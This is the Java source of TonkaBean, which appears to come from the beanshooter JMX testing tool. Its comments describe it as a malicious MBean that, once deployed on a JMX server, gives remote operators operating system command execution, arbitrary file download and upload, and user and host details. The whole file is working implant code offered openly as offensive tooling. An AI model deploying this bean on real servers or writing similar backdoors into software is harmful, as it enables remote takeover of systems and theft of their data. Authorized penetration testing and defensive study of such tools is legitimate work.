package de.qtc.beanshooter.tonkabean;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.InvalidPathException;
import java.nio.file.Paths;
import java.util.Map;

/**
 * The TonkaBean is an example for a malicious MBean. When deployed on an MBeanServer, it allows
 * executing operating system commands and gives access to the file system of the server.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class TonkaBean implements TonkaBeanMBean
{
    /**
     * The main function is only used for debugging purposes (e.g. is the compiled tonka bean working
     * as expected). It prints just a static string to stdout.
     *
     * @param argv command line parameters. Ignored.
     */
    public static void main(String[] argv)
    {
        String version = "TonkaBean v" + TonkaBean.class.getPackage().getImplementationVersion();
        System.out.println(String.format("%s - Deploy me on a JMX service and let's have some fun :)", version));
    }

    /**
     * Return the currently deployed MBean version.
     *
     * @return MBean version
     */
    public String version()
    {
        String tonkaVersion = this.getClass().getPackage().getImplementationVersion();
        String javaVersion = System.getProperty("java.version");

        return String.format("TonkaBean v%s on Java v%s", tonkaVersion, javaVersion);
    }

    /**
     * Return the username that runs the MBeanServer.
     *
     * @return the username the MBeanServer is running with.
     */
    public String[] shellInit()
    {
        String[] returnValue = new String[3];
        returnValue[0] = System.getProperty("user.name");

        if (File.separator == "/")
            returnValue[1] = System.getenv("HOSTNAME");
        else
            returnValue[1] = System.getenv("COMPUTERNAME");

        returnValue[2] = File.separator;

        return returnValue;
    }

    /**
     * Checks whether the specified path is an existing directory on the server and returns
     * the normalized form of it.
     *
     * @param path file system path to check
     * @return normalized File
     */
    public String toServerDir(String path, String change) throws IOException, InvalidPathException
    {
        File changeFile = new File(change);

        if (changeFile.isAbsolute())
            changeFile = Paths.get(change).normalize().toAbsolutePath().toFile();

        else
            changeFile = Paths.get(path, change).normalize().toAbsolutePath().toFile();

        if( !changeFile.isDirectory() )
            throw new IOException("Specified path " + changeFile.getAbsolutePath() + " is not a valid directory.");

        return changeFile.getAbsolutePath();
    }

    /**
     * Execute the specified operating system command. Commands need to be specified as an array with the
     * executable in the first position followed by the arguments for the call. Furthermore, the directory
     * to execute the command in and environment variables can be specified.
     *
     * @param command String array that specified the operating system command
     * @param cwd working directory for the call
     * @param env environment variables to use for the call
     * @return byte array containing the command output (stdout + stderr)
     */
    public byte[] executeCommand(String[] command, String cwd, Map<String,String> env, boolean background) throws IOException, InterruptedException
    {
        ProcessBuilder builder = new ProcessBuilder(command);
        builder.directory(new File(cwd));
        builder.environment().putAll(env);
        builder.redirectErrorStream(true);

        Process proc = builder.start();

        if (background)
            return null;

        proc.waitFor();
        return readInputStream(proc.getInputStream());
    }

    /**
     * Return the content of the specified file.
     *
     * @param filename file system path to the file to download
     * @return byte array containing the file content
     */
    public byte[] downloadFile(String filename) throws IOException
    {
        File file = new File(filename);
        return Files.readAllBytes(file.toPath());
    }

    /**
     * Write the specified byte array to the specified destination on the file system of the server.
     *
     * @param destination file system path on the MBean Server
     * @param content byte array containing the desired file content
     * @return resulting file system path of the newly generated file
     */
    public String uploadFile(String destination, byte[] content) throws IOException
    {
        File file = new File(destination);
        FileOutputStream stream = new FileOutputStream(destination);

        stream.write(content);
        stream.close();

        return file.getAbsolutePath();
    }

    /**
     * Helper function to read all available data from an input stream.
     *
     * @param stream InputStream to read from
     * @return byte array containing the input stream content
     * @throws IOException
     */
    private byte[] readInputStream(InputStream stream) throws IOException
    {
        int readCount;
        byte[] buffer = new byte[4096];
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        while(( readCount = stream.read(buffer, 0, buffer.length)) != -1)
        {
              bos.write(buffer, 0, readCount);
        }

        return bos.toByteArray();
    }
}
